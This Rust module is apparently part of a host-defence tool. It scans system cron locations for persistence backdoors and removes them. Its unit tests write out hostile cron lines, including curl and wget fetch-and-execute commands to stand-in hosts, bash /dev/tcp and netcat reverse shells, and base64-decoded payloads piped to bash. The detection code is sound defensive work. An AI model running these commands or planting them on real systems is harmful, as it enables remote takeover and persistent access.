//! System-wide cron directories and the main system crontab.
//!
//! User crontabs (via `crontab -l`) are handled by `cron.rs`. This module
//! covers the parallel system-level attack surface: files dropped in
//! `/etc/cron.d/` run as arbitrary users without touching any personal crontab,
//! and scripts planted in the periodic directories (`cron.hourly` etc.) are
//! invoked by anacron with no operator-visible entry. Both paths are common
//! red-team persistence techniques that most post-breach checklists miss.

use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};

use crate::core::scan::{
    effective_line, has_strong_reason, invokes_netcat, read_text_file, references_untrusted_dir,
    references_volatile_dir, suspicious_matches,
};
use crate::core::{
    DefenderContext, DefenderError, Finding, Result, Severity, Verdict, require_root,
    try_clear_immutable,
};

/// Additional patterns that are specifically relevant in cron contexts but are
/// not included in the shared suspicious-pattern set.
const CRON_EXTRA: &[(&str, &str)] = &[
    ("nohup", "background execution detached from terminal"),
    ("chmod +x", "make-executable (stage two of a dropper)"),
];

/// The periodic-script directories anacron/cron runs on a schedule.
const PERIODIC_DIRS: &[&str] = &[
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
];

/// Scan system cron locations for persistence.
///
/// Checks `/etc/crontab`, every file under `/etc/cron.d/`, and every script
/// in the four periodic directories. Suspicious cron.d lines are removed;
/// suspicious or tampered periodic scripts are removed entirely.
pub fn run(ctx: &DefenderContext) -> Result {
    if require_root().is_err() {
        ctx.emit(Finding::new(
            Severity::Medium,
            "cron_system",
            "Not running as root — system cron check skipped",
            "Run as root to review /etc/cron.d and the periodic script directories.",
        ));
        return Err(DefenderError::NotRoot);
    }

    ctx.log_msg("[+] Checking system cron locations...");

    // /etc/crontab — the main system crontab
    let system_crontab = PathBuf::from("/etc/crontab");
    if system_crontab.is_file() {
        scan_crontab_file(ctx, &system_crontab);
    }

    // /etc/cron.d/ — arbitrary per-job files, each executed as a specified user
    let cron_d = Path::new("/etc/cron.d");
    if cron_d.is_dir() {
        scan_cron_d_directory(ctx, cron_d);
    }

    // Periodic script directories
    for dir in PERIODIC_DIRS {
        let p = Path::new(dir);
        if p.is_dir() {
            scan_periodic_dir(ctx, p);
        }
    }

    ctx.log_msg("[✓] System cron check complete");
    Ok(())
}

// ── Scanning helpers ──────────────────────────────────────────────────────────

/// Scan a single crontab-format file (like `/etc/crontab`) line by line.
fn scan_crontab_file(ctx: &DefenderContext, path: &Path) {
    ctx.debug(&format!("Scanning {}", path.display()));

    let Some(content) = read_text_file(path) else {
        return;
    };

    for raw_line in content.lines() {
        let Some(line) = effective_line(raw_line) else {
            continue;
        };

        let reasons = matched_patterns(line);
        if reasons.is_empty() {
            continue;
        }
        if !has_strong_reason(&reasons) {
            report_weak_line(ctx, path, line, &reasons);
            continue;
        }

        ctx.log_msg(&format!(
            "[!] Suspicious line in {}: {} [{}]",
            path.display(),
            line,
            reasons.join(", ")
        ));
        ctx.log_evidence_line(&path.display().to_string(), line);

        try_clear_immutable(path);
        let removed = ctx.remove_line_from_file_logged(path, line);

        ctx.emit(
            Finding::new(
                Severity::High,
                "cron_system",
                format!(
                    "System crontab backdoor {} in {}: {}",
                    if removed { "REMOVED" } else { "FOUND" },
                    path.display(),
                    crate::core::truncate_chars(line, 60),
                ),
                format!(
                    "file: {}\nline: {}\npatterns: {}\nremoved: {}",
                    path.display(),
                    line,
                    reasons.join(", "),
                    removed,
                ),
            )
            .with_path(path.to_path_buf())
            .with_context("line", line.to_string())
            .with_context("patterns", reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed {
                    Verdict::Remove
                } else {
                    Verdict::Investigate
                },
                format!(
                    "Line matched suspicious pattern(s) [{}]. {}.",
                    reasons.join(", "),
                    if removed {
                        "Removed from file"
                    } else {
                        "Manual removal required"
                    },
                ),
            ),
        );
    }
}

/// Walk every file in `/etc/cron.d/` and check each non-comment line.
fn scan_cron_d_directory(ctx: &DefenderContext, dir: &Path) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_file() {
            scan_cron_d_file(ctx, &path);
        }
    }
}

/// Scan one file inside `/etc/cron.d/`.
///
/// If any suspicious line is found, the whole file is removed -- not just the
/// offending line. A cron.d file with any malicious entry is itself the payload;
/// there is no safe "partially clean" version to keep.
fn scan_cron_d_file(ctx: &DefenderContext, path: &Path) {
    ctx.debug(&format!("Scanning cron.d file: {}", path.display()));

    let Some(content) = read_text_file(path) else {
        return;
    };

    // Collect all suspicious lines and their reasons before acting.
    let hits: Vec<(&str, Vec<String>)> = content
        .lines()
        .filter_map(effective_line)
        .filter_map(|line| {
            let r = matched_patterns(line);
            if r.is_empty() { None } else { Some((line, r)) }
        })
        .collect();

    if hits.is_empty() {
        return;
    }
    // A whole cron.d file is quarantined only on strong evidence.
    if !hits.iter().any(|(_, r)| has_strong_reason(r)) {
        for (line, reasons) in &hits {
            report_weak_line(ctx, path, line, reasons);
        }
        return;
    }

    let all_reasons: Vec<String> = hits
        .iter()
        .flat_map(|(_, r)| r.iter().cloned())
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect();

    ctx.log_msg(&format!(
        "[!] Suspicious cron.d file {} ({} bad line(s)) [{}] -- nuking whole file",
        path.display(),
        hits.len(),
        all_reasons.join(", ")
    ));
    ctx.log_evidence_file(path);

    try_clear_immutable(path);
    let removed = ctx.remove_path_logged(path);

    ctx.emit(
        Finding::new(
            Severity::Critical,
            "cron_system",
            format!(
                "cron.d backdoor file {} {}: {} suspicious line(s)",
                path.display(),
                if removed { "REMOVED" } else { "FOUND" },
                hits.len(),
            ),
            format!(
                "file: {}\nsuspicious_lines:\n  {}\npatterns: {}\nremoved: {}",
                path.display(),
                hits.iter()
                    .map(|(l, _)| *l)
                    .collect::<Vec<_>>()
                    .join("\n  "),
                all_reasons.join(", "),
                removed,
            ),
        )
        .with_path(path.to_path_buf())
        .with_context("cron.d file", path.display().to_string())
        .with_context("patterns", all_reasons.join(", "))
        .with_context("removed", removed.to_string())
        .with_verdict(
            if removed {
                Verdict::Remove
            } else {
                Verdict::Investigate
            },
            format!(
                "cron.d file matched suspicious pattern(s) [{}]. \
                 Entire file removed -- any entry in /etc/cron.d runs as an arbitrary user.",
                all_reasons.join(", "),
            ),
        ),
    );
}

/// Scan one of the periodic script directories (hourly/daily/weekly/monthly).
///
/// Two classes of finding here:
///
/// 1. A script whose *content* contains suspicious patterns → remove it.
/// 2. A script that is *world-writable* or owned by a non-root user → remove it,
///    even if the content looks clean, because the ownership makes it trivial to
///    swap in a malicious replacement.
fn scan_periodic_dir(ctx: &DefenderContext, dir: &Path) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        ctx.debug(&format!("Inspecting periodic script: {}", path.display()));

        // ── Ownership / permission check ─────────────────────────────────────
        if let Ok(meta) = std::fs::metadata(&path) {
            let mode = meta.permissions().mode();
            let is_world_writable = mode & 0o002 != 0;
            let is_non_root_owned = meta.uid() != 0;

            if is_world_writable || is_non_root_owned {
                let reason = if is_world_writable && is_non_root_owned {
                    format!(
                        "world-writable (mode {:04o}) and owned by uid {} (not root)",
                        mode & 0o7777,
                        meta.uid()
                    )
                } else if is_world_writable {
                    format!("world-writable (mode {:04o})", mode & 0o7777)
                } else {
                    format!("owned by uid {} (not root)", meta.uid())
                };

                ctx.log_msg(&format!(
                    "[!] Tampered periodic script {}: {}",
                    path.display(),
                    reason
                ));
                ctx.log_evidence_file(&path);

                try_clear_immutable(&path);
                let removed = ctx.remove_path_logged(&path);

                ctx.emit(
                    Finding::new(
                        Severity::High,
                        "cron_system",
                        format!(
                            "Tampered periodic script {} {}: {}",
                            path.display(),
                            if removed { "REMOVED" } else { "FOUND" },
                            reason
                        ),
                        format!(
                            "path: {}\nreason: {}\nremoved: {}",
                            path.display(),
                            reason,
                            removed,
                        ),
                    )
                    .with_path(path.clone())
                    .with_context("reason", reason)
                    .with_context("mode", format!("{:04o}", mode & 0o7777))
                    .with_context("uid", meta.uid().to_string())
                    .with_context("removed", removed.to_string())
                    .with_verdict(
                        if removed {
                            Verdict::Remove
                        } else {
                            Verdict::Investigate
                        },
                        "Periodic scripts in /etc/cron.* must be owned by root and not \
                         world-writable. This script fails that check and is a persistence risk \
                         regardless of its current content.",
                    ),
                );

                // No need to also check content — the script is gone.
                continue;
            }
        }

        // ── Content check ────────────────────────────────────────────────────
        let Some(content) = read_text_file(&path) else {
            continue;
        };

        let suspicious_lines: Vec<&str> = content
            .lines()
            .filter_map(effective_line)
            .filter(|l| !matched_patterns(l).is_empty())
            .collect();

        if suspicious_lines.is_empty() {
            continue;
        }
        if !suspicious_lines
            .iter()
            .any(|l| has_strong_reason(&matched_patterns(l)))
        {
            for line in &suspicious_lines {
                report_weak_line(ctx, &path, line, &matched_patterns(line));
            }
            continue;
        }

        let reasons: Vec<String> = suspicious_lines
            .iter()
            .flat_map(|l| matched_patterns(l))
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .collect();

        ctx.log_msg(&format!(
            "[!] Suspicious periodic script {}: {} suspicious line(s) [{}]",
            path.display(),
            suspicious_lines.len(),
            reasons.join(", ")
        ));
        ctx.log_evidence_file(&path);

        try_clear_immutable(&path);
        let removed = ctx.remove_path_logged(&path);

        ctx.emit(
            Finding::new(
                Severity::Critical,
                "cron_system",
                format!(
                    "Malicious periodic script {} {}: {} suspicious line(s)",
                    path.display(),
                    if removed { "REMOVED" } else { "FOUND" },
                    suspicious_lines.len()
                ),
                format!(
                    "path: {}\nsuspicious_lines:\n  {}\npatterns: {}\nremoved: {}",
                    path.display(),
                    suspicious_lines.join("\n  "),
                    reasons.join(", "),
                    removed,
                ),
            )
            .with_path(path.clone())
            .with_context("suspicious_lines", suspicious_lines.len().to_string())
            .with_context("patterns", reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed {
                    Verdict::Remove
                } else {
                    Verdict::Investigate
                },
                format!(
                    "Periodic script contains suspicious pattern(s) [{}]. \
                     Scripts in this directory execute automatically on a schedule. \
                     The file was {}.",
                    reasons.join(", "),
                    if removed {
                        "removed"
                    } else {
                        "NOT removed — manual action required"
                    },
                ),
            ),
        );
    }
}

// ── Detection helpers ─────────────────────────────────────────────────────────

/// Reasons a cron line looks like a persistence mechanism.
///
/// Combines the shared scanner patterns (reverse shells, fetch-and-execute, etc.)
/// with a few cron-specific additions like `nohup` and `chmod +x` that are less
/// relevant in other contexts.
fn matched_patterns(line: &str) -> Vec<String> {
    let mut reasons: Vec<String> = suspicious_matches(line)
        .into_iter()
        .map(str::to_string)
        .collect();

    if references_volatile_dir(line) {
        let r = "execution from world-writable directory";
        if !reasons.iter().any(|s| s == r) {
            reasons.push(r.to_string());
        }
    } else if references_untrusted_dir(line) {
        reasons.push("execution from a home directory".to_string());
    }

    // Token match, not the old "nc -" substring that also hit `rsync -a`.
    if invokes_netcat(line) {
        reasons.push("netcat connection".to_string());
    }

    let lowered = line.to_lowercase();
    for (needle, why) in CRON_EXTRA {
        if lowered.contains(needle) {
            let r = why.to_string();
            if !reasons.contains(&r) {
                reasons.push(r);
            }
        }
    }

    if has_hidden_path_component(line) {
        let r = "execution from hidden path (dot-file component in command)".to_string();
        if !reasons.contains(&r) {
            reasons.push(r);
        }
    }

    reasons
}

/// Report a line whose matches are all weak (see
/// [`crate::core::scan::WEAK_REASONS`]) without touching the file.
fn report_weak_line(ctx: &DefenderContext, path: &Path, line: &str, reasons: &[String]) {
    ctx.emit(
        Finding::new(
            Severity::Medium,
            "cron_system",
            format!(
                "Review cron entry in {}: {}",
                path.display(),
                crate::core::truncate_chars(line, 60)
            ),
            format!(
                "file: {}\nline: {}\npatterns: {}\nremoved: false",
                path.display(),
                line,
                reasons.join(", ")
            ),
        )
        .with_path(path.to_path_buf())
        .with_verdict(
            Verdict::Investigate,
            format!(
                "Matched only [{}], which also shows up in legitimate jobs, so the entry \
                 was left in place. Remove it by hand if it is not expected.",
                reasons.join(", ")
            ),
        ),
    );
}

/// True if any whitespace-delimited token in `line` looks like a path with a
/// dot-prefixed basename, e.g. `/usr/lib/.helper` or `/etc/.something`.
///
/// This catches hidden-file execution regardless of which directory it lives in.
fn has_hidden_path_component(line: &str) -> bool {
    line.split_whitespace().any(|token| {
        // Must look like an absolute path (contains '/') and have a hidden basename.
        if !token.contains('/') {
            return false;
        }
        token
            .rsplit('/')
            .next()
            .map(|basename| basename.starts_with('.') && basename.len() > 1)
            .unwrap_or(false)
    })
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_cron_line_matches_nothing() {
        assert!(matched_patterns("0 2 * * * /usr/bin/backup.sh").is_empty());
        assert!(matched_patterns("@reboot /usr/sbin/ntpd -p /run/ntpd.pid").is_empty());
    }

    #[test]
    fn wget_into_tmp_is_flagged() {
        let r = matched_patterns("*/5 * * * * wget http://evil.test/x -O /tmp/x");
        assert!(!r.is_empty());
        assert!(
            r.iter()
                .any(|s| s.contains("world-writable") || s.contains("remote content"))
        );
    }

    #[test]
    fn pipe_to_bash_is_flagged() {
        let r = matched_patterns("*/5 * * * * curl http://c2/payload | bash");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("shell")));
        assert!(r.iter().any(|s| s.contains("remote content")));
    }

    #[test]
    fn nohup_is_flagged() {
        let r = matched_patterns("@reboot nohup /usr/local/bin/agent &");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("background")));
    }

    #[test]
    fn chmod_x_is_flagged() {
        let r = matched_patterns("* * * * * chmod +x /var/tmp/run && /var/tmp/run");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("executable")));
    }

    #[test]
    fn mkfifo_reverse_shell_is_flagged() {
        let r = matched_patterns("* * * * * mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("named pipe")));
    }

    #[test]
    fn base64_decode_is_flagged() {
        let r = matched_patterns("@daily echo dGVzdA== | base64 -d | bash");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("base64")));
    }

    #[test]
    fn comment_line_is_not_effective() {
        assert!(effective_line("# * * * * * wget http://evil/x.sh | bash").is_none());
        assert!(effective_line("").is_none());
        assert!(effective_line("   ").is_none());
    }

    #[test]
    fn python_one_liner_is_flagged() {
        let r = matched_patterns("@reboot python3 -c 'import socket; ...'");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("inline interpreter")));
    }

    #[test]
    fn dev_shm_execution_is_flagged() {
        let r = matched_patterns("* * * * * /dev/shm/.hidden");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("world-writable")));
    }

    #[test]
    fn duplicate_reason_names_deduplicated() {
        // "execution from world-writable directory" should appear only once
        let r = matched_patterns("* * * * * /tmp/a && /var/tmp/b && /dev/shm/c");
        let count = r
            .iter()
            .filter(|s| s.as_str() == "execution from world-writable directory")
            .count();
        assert_eq!(count, 1);
    }

    #[test]
    fn rsync_is_not_mistaken_for_netcat() {
        let r = matched_patterns("0 4 * * * root rsync -a /srv /mnt/backup");
        assert!(r.is_empty(), "rsync flagged: {r:?}");
    }

    #[test]
    fn certbot_cron_is_not_a_removal_candidate() {
        let r = matched_patterns(
            "0 */12 * * * root test -x /usr/bin/certbot && perl -e 'sleep int(rand(43200))' && certbot -q renew",
        );
        assert!(!has_strong_reason(&r), "{r:?}");
    }

    #[test]
    fn netcat_is_flagged() {
        // CRON_EXTRA: "nc -" pattern
        let r = matched_patterns("* * * * * nc -e /bin/bash 192.168.1.1 4444");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("netcat")));
    }

    #[test]
    fn chmod_plus_x_is_flagged() {
        // CRON_EXTRA: "chmod +x" pattern
        let r = matched_patterns("@reboot chmod +x /var/tmp/payload && /var/tmp/payload");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("executable")));
    }

    #[test]
    fn clean_backup_script_is_not_flagged() {
        // Ensure a realistic legitimate entry produces no findings.
        assert!(matched_patterns("0 3 * * * root /usr/local/bin/backup.sh").is_empty());
        assert!(
            matched_patterns("*/15 * * * * www-data /usr/bin/php /var/www/cron.php").is_empty()
        );
    }

    #[test]
    fn openssl_decode_is_flagged() {
        let r = matched_patterns("* * * * * echo abc | openssl enc -d -base64 | bash");
        assert!(!r.is_empty());
    }

    #[test]
    fn reverse_shell_via_bash_tcp_is_flagged() {
        let r = matched_patterns("* * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1");
        assert!(!r.is_empty());
    }

    #[test]
    fn perl_reverse_shell_is_flagged() {
        let r = matched_patterns("* * * * * perl -e 'use Socket; ...'");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("inline interpreter")));
    }

    #[test]
    fn effective_line_trims_whitespace() {
        assert_eq!(
            effective_line("  * * * * * /usr/bin/backup.sh  "),
            Some("* * * * * /usr/bin/backup.sh"),
        );
    }

    #[test]
    fn effective_line_rejects_comment_regardless_of_leading_space() {
        assert!(effective_line("  # disabled cron entry").is_none());
    }

    #[test]
    fn hidden_path_in_usr_lib_is_flagged() {
        let r = matched_patterns("* * * * * /usr/lib/.helper");
        assert!(!r.is_empty(), "hidden path in /usr/lib/ should be flagged");
        assert!(r.iter().any(|s| s.contains("hidden path")));
    }

    #[test]
    fn hidden_path_in_etc_is_flagged() {
        let r = matched_patterns("@reboot /etc/.backdoor arg1");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("hidden path")));
    }

    #[test]
    fn has_hidden_path_component_matches_dotfile_in_subdir() {
        assert!(has_hidden_path_component("/usr/local/lib/.hidden_script"));
        assert!(has_hidden_path_component("/var/lib/.payload"));
    }

    #[test]
    fn has_hidden_path_component_ignores_normal_paths() {
        assert!(!has_hidden_path_component("/usr/bin/python3"));
        assert!(!has_hidden_path_component("/etc/cron.d/cleanup"));
        assert!(!has_hidden_path_component("relative_name"));
    }

    #[test]
    fn has_hidden_path_component_ignores_dotfiles_as_non_path_tokens() {
        // A bare dotfile name without a directory separator should not match.
        assert!(!has_hidden_path_component(".hidden_no_slash"));
    }
}
